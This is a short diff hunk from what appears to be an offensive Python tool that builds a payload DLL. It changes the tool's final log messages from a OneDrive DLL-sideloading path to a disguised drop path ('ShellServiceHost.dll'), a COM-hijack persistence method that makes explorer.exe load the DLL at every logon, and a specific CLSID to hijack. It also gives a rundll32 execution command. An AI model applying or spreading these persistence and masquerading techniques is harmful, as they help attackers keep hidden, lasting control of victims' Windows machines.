@@ -982,8 +982,9 @@ def build_dll(raw_payload, output_name="payload.dll"):
     print()
     log("=== DLL Build Complete ===", "OK")
     log(f"Execute: rundll32.exe {output_name},EntryPoint", "OK")
-    log(f"Sideload target: %LOCALAPPDATA%\\Microsoft\\OneDrive\\version.dll", "OK")
-    log(f"Persistence: OneDrive.exe loads the DLL on next logon", "OK")
+    log(f"Drop path: %APPDATA%\\Microsoft\\Windows\\Shell\\ShellServiceHost.dll", "OK")
+    log(f"Persistence: COM hijack → explorer.exe loads DLL on every logon", "OK")
+    log(f"COM CLSID: {{BCDE0395-E52F-467C-8E3D-C4579291692E}} (MMDeviceEnumerator)", "OK")
 
 
 # ============================================================
